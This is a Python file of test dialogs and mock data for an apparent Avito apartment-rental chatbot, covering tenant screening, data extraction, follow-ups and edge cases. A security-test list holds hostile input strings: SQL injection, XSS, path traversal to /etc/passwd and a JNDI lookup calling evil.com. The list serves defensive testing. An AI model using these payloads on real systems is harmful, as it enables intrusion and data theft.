#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Тестовые сценарии и данные для Avito Rental Bot
Содержит различные диалоги и ситуации для тестирования
"""

import time
from datetime import datetime

class TestScenarios:
    """Класс с тестовыми сценариями диалогов"""
    
    @staticmethod
    def get_complete_dialog_scenario():
        """Полный успешный диалог от начала до завершения"""
        base_time = int(time.time())
        
        return {
            "name": "Полный успешный диалог",
            "description": "Клиент проходит все этапы и предоставляет всю информацию",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 300,
                    "author_id": 12345,
                    "content": {"text": "Здравствуйте, интересует квартира"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text", 
                    "created": base_time - 295,
                    "author_id": 0,
                    "content": {"text": "Здравствуйте, на связи Светлана, АН Skyline\nРасскажите, пожалуйста, кто проживать планирует"}
                },
                {
                    "id": 3,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 290,
                    "author_id": 12345,
                    "content": {"text": "Буду жить я один, мужчина 28 лет"}
                },
                {
                    "id": 4,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 285,
                    "author_id": 0,
                    "content": {"text": "Дети планируются?"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 280,
                    "author_id": 12345,
                    "content": {"text": "Нет детей"}
                },
                {
                    "id": 6,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 275,
                    "author_id": 0,
                    "content": {"text": "Животные есть?"}
                },
                {
                    "id": 7,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 270,
                    "author_id": 12345,
                    "content": {"text": "Нет животных"}
                },
                {
                    "id": 8,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 265,
                    "author_id": 0,
                    "content": {"text": "От скольки месяцев рассматриваете аренду?"}
                },
                {
                    "id": 9,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 260,
                    "author_id": 12345,
                    "content": {"text": "От 12 месяцев минимум"}
                },
                {
                    "id": 10,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 255,
                    "author_id": 0,
                    "content": {"text": "Когда планируете заезжать?"}
                },
                {
                    "id": 11,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 250,
                    "author_id": 12345,
                    "content": {"text": "С 1 сентября"}
                },
                {
                    "id": 12,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 245,
                    "author_id": 0,
                    "content": {"text": "Как Вас зовут?"}
                },
                {
                    "id": 13,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 240,
                    "author_id": 12345,
                    "content": {"text": "Алексей"}
                },
                {
                    "id": 14,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 235,
                    "author_id": 0,
                    "content": {"text": "Номер телефона для связи?"}
                },
                {
                    "id": 15,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 230,
                    "author_id": 12345,
                    "content": {"text": "+7 999 123 45 67"}
                }
            ],
            "expected_extraction": {
                "name": "Алексей",
                "phone": "+7 999 123 45 67",
                "residents_info": "мужчина 28 лет",
                "residents_count": 1,
                "residents_details": "мужчина 28 лет",
                "has_children": False,
                "children_details": None,
                "has_pets": False,
                "pets_details": None,
                "rental_period": "от 12 месяцев минимум",
                "move_in_deadline": "с 1 сентября"
            }
        }
    
    @staticmethod
    def get_family_with_pets_scenario():
        """Семья с детьми и животными"""
        base_time = int(time.time())
        
        return {
            "name": "Семья с детьми и животными",
            "description": "Более сложный случай с семьей, детьми и животными",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 200,
                    "author_id": 67890,
                    "content": {"text": "Добрый день! Можем ли мы посмотреть квартиру?"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 195,
                    "author_id": 0,
                    "content": {"text": "Здравствуйте, на связи Светлана, АН Skyline\nРасскажите, пожалуйста, кто проживать планирует"}
                },
                {
                    "id": 3,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 190,
                    "author_id": 67890,
                    "content": {"text": "Семья: я, муж и двое детей"}
                },
                {
                    "id": 4,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 185,
                    "author_id": 0,
                    "content": {"text": "Расскажите подробнее про детей"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 180,
                    "author_id": 67890,
                    "content": {"text": "Сын 8 лет и дочка 5 лет"}
                },
                {
                    "id": 6,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 175,
                    "author_id": 0,
                    "content": {"text": "Животные есть?"}
                },
                {
                    "id": 7,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 170,
                    "author_id": 67890,
                    "content": {"text": "Да, у нас кот"}
                },
                {
                    "id": 8,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 165,
                    "author_id": 0,
                    "content": {"text": "Люблю животных🥰 От скольки месяцев рассматриваете аренду?"}
                },
                {
                    "id": 9,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 160,
                    "author_id": 67890,
                    "content": {"text": "От 6 месяцев"}
                },
                {
                    "id": 10,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 50,
                    "author_id": 67890,
                    "content": {"text": "С середины августа хотели бы"}
                },
                {
                    "id": 11,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 30,
                    "author_id": 67890,
                    "content": {"text": "Марина меня зовут, +7 926 555 77 88"}
                }
            ],
            "expected_extraction": {
                "name": "Марина",
                "phone": "+7 926 555 77 88",
                "residents_info": "семья: муж и жена",
                "residents_count": 2,
                "residents_details": "семья: муж и жена",
                "has_children": True,
                "children_details": "сын 8 лет и дочка 5 лет",
                "has_pets": True,
                "pets_details": "кот",
                "rental_period": "от 6 месяцев",
                "move_in_deadline": "с середины августа"
            }
        }
    
    @staticmethod
    def get_incomplete_dialog_scenario():
        """Незавершенный диалог"""
        base_time = int(time.time())
        
        return {
            "name": "Незавершенный диалог",
            "description": "Клиент не дает полную информацию",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 100,
                    "author_id": 11111,
                    "content": {"text": "Здравствуйте, интересует квартира"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 95,
                    "author_id": 0,
                    "content": {"text": "Здравствуйте, на связи Светлана, АН Skyline\nРасскажите, пожалуйста, кто проживать планирует"}
                },
                {
                    "id": 3,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 90,
                    "author_id": 11111,
                    "content": {"text": "Буду жить один"}
                },
                {
                    "id": 4,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 85,
                    "author_id": 0,
                    "content": {"text": "Подскажите Ваш возраст"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 80,
                    "author_id": 11111,
                    "content": {"text": "30"}
                }
            ],
            "expected_stage": "residents",
            "should_followup": True
        }
    
    @staticmethod
    def get_difficult_client_scenario():
        """Сложный клиент с неточными ответами"""
        base_time = int(time.time())
        
        return {
            "name": "Сложный клиент",
            "description": "Клиент дает неточные ответы, требует переспросов",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 150,
                    "author_id": 22222,
                    "content": {"text": "Привет, квартира свободна?"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 145,
                    "author_id": 0,
                    "content": {"text": "Здравствуйте, на связи Светлана, АН Skyline\nРасскажите, пожалуйста, кто проживать планирует"}
                },
                {
                    "id": 3,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 140,
                    "author_id": 22222,
                    "content": {"text": "Семья"}
                },
                {
                    "id": 4,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 135,
                    "author_id": 0,
                    "content": {"text": "Подскажите пол и возраст каждого взрослого"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 130,
                    "author_id": 22222,
                    "content": {"text": "Пара молодая"}
                },
                {
                    "id": 6,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 125,
                    "author_id": 0,
                    "content": {"text": "Конкретнее пожалуйста - сколько лет каждому?"}
                },
                {
                    "id": 7,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 120,
                    "author_id": 22222,
                    "content": {"text": "Мне 25, жене 23"}
                },
                {
                    "id": 8,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 115,
                    "author_id": 0,
                    "content": {"text": "Дети планируются?"}
                },
                {
                    "id": 9,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 110,
                    "author_id": 22222,
                    "content": {"text": "Возможно"}
                },
                {
                    "id": 10,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 105,
                    "author_id": 0,
                    "content": {"text": "Сейчас есть дети?"}
                },
                {
                    "id": 11,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 100,
                    "author_id": 22222,
                    "content": {"text": "Нет"}
                },
                {
                    "id": 12,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 95,
                    "author_id": 0,
                    "content": {"text": "Животные есть?"}
                },
                {
                    "id": 13,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 90,
                    "author_id": 22222,
                    "content": {"text": "Нет"}
                },
                {
                    "id": 14,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 85,
                    "author_id": 0,
                    "content": {"text": "От скольки месяцев рассматриваете аренду?"}
                },
                {
                    "id": 15,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 80,
                    "author_id": 22222,
                    "content": {"text": "Надолго"}
                },
                {
                    "id": 16,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 75,
                    "author_id": 0,
                    "content": {"text": "От скольки месяцев конкретно?"}
                },
                {
                    "id": 17,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 70,
                    "author_id": 22222,
                    "content": {"text": "От года"}
                },
                {
                    "id": 18,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 20,
                    "author_id": 22222,
                    "content": {"text": "С октября хотим, Дмитрий, 89161234567"}
                }
            ],
            "expected_extraction": {
                "name": "Дмитрий",
                "phone": "89161234567",
                "residents_info": "мужчина 25 лет и женщина 23 года",
                "residents_count": 2,
                "has_children": False,
                "has_pets": False,
                "rental_period": "от года",
                "move_in_deadline": "с октября"
            }
        }
    
    @staticmethod
    def get_system_message_scenario():
        """Сценарий с системными сообщениями"""
        base_time = int(time.time())
        
        return {
            "name": "Диалог с системными сообщениями",
            "description": "Диалог содержит системные сообщения, которые нужно игнорировать",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 120,
                    "author_id": 33333,
                    "content": {"text": "Здравствуйте"}
                },
                {
                    "id": 2,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 115,
                    "author_id": 0,  # Системное сообщение
                    "content": {"text": "Пользователь подключился к чату"}
                },
                {
                    "id": 3,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 110,
                    "author_id": 0,
                    "content": {"text": "Здравствуйте, на связи Светлана, АН Skyline"}
                },
                {
                    "id": 4,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 105,
                    "author_id": 0,  # Системное сообщение
                    "content": {"text": "Сообщение удалено"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 100,
                    "author_id": 33333,
                    "content": {"text": "Буду жить один, мужчина 35 лет"}
                }
            ],
            "expected_behavior": "Системные сообщения игнорируются"
        }
    
    @staticmethod
    def get_followup_scenario():
        """Сценарий для тестирования follow-up"""
        base_time = int(time.time()) - 7200  # 2 часа назад
        
        return {
            "name": "Follow-up тестирование",
            "description": "Клиент не отвечает, должен получить follow-up сообщения",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time,
                    "author_id": 44444,
                    "content": {"text": "Интересует квартира"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time + 5,
                    "author_id": 0,
                    "content": {"text": "Здравствуйте, на связи Светлана, АН Skyline\nРасскажите, пожалуйста, кто проживать планирует"}
                }
            ],
            "last_client_activity": base_time,
            "should_trigger_followup": True,
            "followup_intervals": ["2h", "16h", "2d", "4d"]
        }
    
    @staticmethod
    def get_edge_case_scenarios():
        """Пограничные случаи"""
        return {
            "empty_messages": {
                "name": "Пустые сообщения",
                "messages": [],
                "expected_behavior": "Корректная обработка пустого списка"
            },
            "only_system_messages": {
                "name": "Только системные сообщения",
                "messages": [
                    {
                        "id": 1,
                        "direction": "in",
                        "type": "text",
                        "created": int(time.time()),
                        "author_id": 0,
                        "content": {"text": "Системное сообщение"}
                    }
                ],
                "expected_behavior": "Игнорирование системных сообщений"
            },
            "malformed_messages": {
                "name": "Некорректные сообщения",
                "messages": [
                    {
                        "id": 1,
                        "direction": "in",
                        "type": "image",  # Не текст
                        "created": int(time.time()),
                        "author_id": 12345
                    },
                    {
                        "id": 2,
                        "direction": "in",
                        "type": "text",
                        "created": int(time.time()),
                        "author_id": 12345,
                        "content": {}  # Пустой контент
                    }
                ],
                "expected_behavior": "Игнорирование некорректных сообщений"
            }
        }

class TestData:
    """Класс с тестовыми данными"""
    
    @staticmethod
    def get_mock_chat_data():
        """Моковые данные чата"""
        return {
            "id": "test_chat_12345",
            "context": {
                "value": {
                    "title": "2-к квартира, 60 м², 5/9 эт.",
                    "price_string": "45 000 ₽/мес.",
                    "location": {
                        "title": "Москва, м. Сокольники",
                        "lat": 55.7558,
                        "lon": 37.6176
                    },
                    "url": "https://www.avito.ru/moskva/kvartiry/test-123456"
                }
            }
        }
    
    @staticmethod
    def get_mock_openai_responses():
        """Моковые ответы от OpenAI"""
        return {
            "greeting_response": "Здравствуйте, на связи Светлана, АН Skyline\nРасскажите, пожалуйста, кто проживать планирует",
            "residents_question": "Подскажите пол и возраст каждого взрослого",
            "children_question": "Дети планируются?",
            "pets_question": "Животные есть?",
            "period_question": "От скольки месяцев рассматриваете аренду?",
            "date_question": "Когда планируете заезжать?",
            "name_question": "Как Вас зовут?",
            "phone_question": "Номер телефона для связи?",
            "completion_response": "Отлично, обсудим вас с собственницей, если одобрит, то свяжемся с Вами🤝 [COMPLETE]",
            "extraction_result": {
                "name": "Тестовый Клиент",
                "phone": "+7 999 123 45 67",
                "residents_info": "мужчина 30 лет",
                "residents_count": 1,
                "residents_details": "мужчина 30 лет",
                "has_children": False,
                "children_details": None,
                "has_pets": False,
                "pets_details": None,
                "rental_period": "от 12 месяцев",
                "move_in_deadline": "с 1 сентября"
            }
        }
    
    @staticmethod
    def get_mock_telegram_message():
        """Моковое сообщение для Telegram"""
        return """🏠 НОВАЯ ЗАЯВКА НА АРЕНДУ

📋 Объявление: 2-к квартира, 60 м², 5/9 эт.
📍 Адрес: Москва, м. Сокольники

👤 Имя: Тестовый Клиент
📞 Телефон: +7 999 123 45 67
👥 Жильцы: мужчина 30 лет
🔢 Количество взрослых: 1
👶 Дети: Нет
🐾 Животные: Нет
📅 Срок аренды: от 12 месяцев
🗓️ Дата заезда: с 1 сентября

✅ Статус: Готов к презентации собственнице"""

    @staticmethod
    def get_performance_test_data():
        """Данные для тестирования производительности"""
        base_time = int(time.time())
        
        # Генерируем много сообщений для нагрузочного тестирования
        messages = []
        for i in range(100):
            messages.extend([
                {
                    "id": i * 2 + 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - (100 - i) * 10,
                    "author_id": 12345 + i,
                    "content": {"text": f"Сообщение от клиента {i}"}
                },
                {
                    "id": i * 2 + 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - (100 - i) * 10 + 5,
                    "author_id": 0,
                    "content": {"text": f"Ответ агента {i}"}
                }
            ])
        
        return {
            "name": "Нагрузочное тестирование",
            "messages": messages,
            "expected_processing_time": 1.0  # Секунды
        }
    
    @staticmethod
    def get_security_test_data():
        """Данные для тестирования безопасности"""
        return {
            "malicious_inputs": [
                "'; DROP TABLE users; --",  # SQL injection
                "<script>alert('xss')</script>",  # XSS
                "../../etc/passwd",  # Path traversal
                "${jndi:ldap://evil.com/x}",  # JNDI injection
                "javascript:alert(1)",  # JavaScript injection
                "\x00\x01\x02",  # Null bytes
                "A" * 10000,  # Buffer overflow attempt
                "\n\r\t",  # Control characters
                "🤖💻🔥" * 100,  # Unicode bombing
                "eval('alert(1)')"  # Code injection
            ],
            "valid_phones": [
                "+7 999 123 45 67",
                "8 (999) 123-45-67",
                "79991234567",
                "+7(999)1234567"
            ],
            "invalid_phones": [
                "123",
                "abc",
                "+7 999",
                "javascript:alert(1)",
                "<script>",
                "'; DROP TABLE"
            ]
        }

class ScenarioRunner:
    """Класс для запуска тестовых сценариев"""
    
    def __init__(self):
        self.scenarios = TestScenarios()
        self.test_data = TestData()
        
    def get_all_dialog_scenarios(self):
        """Получить все сценарии диалогов"""
        return [
            self.scenarios.get_complete_dialog_scenario(),
            self.scenarios.get_family_with_pets_scenario(),
            self.scenarios.get_incomplete_dialog_scenario(),
            self.scenarios.get_difficult_client_scenario(),
            self.scenarios.get_system_message_scenario(),
            self.scenarios.get_followup_scenario()
        ]
    
    def get_edge_cases(self):
        """Получить пограничные случаи"""
        return self.scenarios.get_edge_case_scenarios()
    
    def validate_scenario(self, scenario):
        """Валидация сценария"""
        required_fields = ["name", "description", "messages"]
        
        for field in required_fields:
            if field not in scenario:
                return False, f"Отсутствует поле: {field}"
                
        if not isinstance(scenario["messages"], list):
            return False, "messages должен быть списком"
            
        for i, message in enumerate(scenario["messages"]):
            required_msg_fields = ["id", "direction", "type", "created", "author_id"]
            for field in required_msg_fields:
                if field not in message:
                    return False, f"В сообщении {i} отсутствует поле: {field}"
                    
        return True, "Сценарий валиден"
    
    def print_scenario_summary(self, scenario):
        """Вывод краткого описания сценария"""
        print(f"Сценарий: {scenario['name']}")
        print(f"Описание: {scenario['description']}")
        print(f"Сообщений: {len(scenario['messages'])}")
        
        # Подсчет сообщений по направлениям
        incoming = len([m for m in scenario['messages'] if m['direction'] == 'in'])
        outgoing = len([m for m in scenario['messages'] if m['direction'] == 'out'])
        
        print(f"Входящих: {incoming}, Исходящих: {outgoing}")
        
        if 'expected_extraction' in scenario:
            print("Ожидается извлечение данных клиента")
            
        if 'should_followup' in scenario:
            print(f"Follow-up ожидается: {scenario['should_followup']}")
            
        print("-" * 50)

def main():
    """Демонстрация тестовых сценариев"""
    print("ТЕСТОВЫЕ СЦЕНАРИИ AVITO RENTAL BOT")
    print("=" * 50)
    
    runner = ScenarioRunner()
    
    # Получаем все сценарии
    scenarios = runner.get_all_dialog_scenarios()
    edge_cases = runner.get_edge_cases()
    
    print(f"\nВсего диалоговых сценариев: {len(scenarios)}")
    print(f"Пограничных случаев: {len(edge_cases)}")
    
    print(f"\nОПИСАНИЕ СЦЕНАРИЕВ:")
    print("-" * 30)
    
    # Выводим описание каждого сценария
    for scenario in scenarios:
        is_valid, message = runner.validate_scenario(scenario)
        if is_valid:
            runner.print_scenario_summary(scenario)
        else:
            print(f"ОШИБКА в сценарии {scenario.get('name', 'Безымянный')}: {message}")
    
    # Пограничные случаи
    print(f"\nПОГРАНИЧНЫЕ СЛУЧАИ:")
    print("-" * 20)
    for case_name, case_data in edge_cases.items():
        print(f"- {case_data['name']}: {case_data['expected_behavior']}")
    
    # Данные для тестирования безопасности
    security_data = runner.test_data.get_security_test_data()
    print(f"\nТЕСТЫ БЕЗОПАСНОСТИ:")
    print("-" * 18)
    print(f"Малициозных входов: {len(security_data['malicious_inputs'])}")
    print(f"Валидных телефонов: {len(security_data['valid_phones'])}")
    print(f"Невалидных телефонов: {len(security_data['invalid_phones'])}")
    
    print(f"\nИСПОЛЬЗОВАНИЕ:")
    print("Эти сценарии можно использовать в test_system.py для:")
    print("- Тестирования логики обработки диалогов")
    print("- Проверки извлечения данных клиентов")
    print("- Тестирования follow-up механизма")
    print("- Проверки безопасности и обработки ошибок")
    print("- Нагрузочного тестирования")

if __name__ == "__main__":
    main()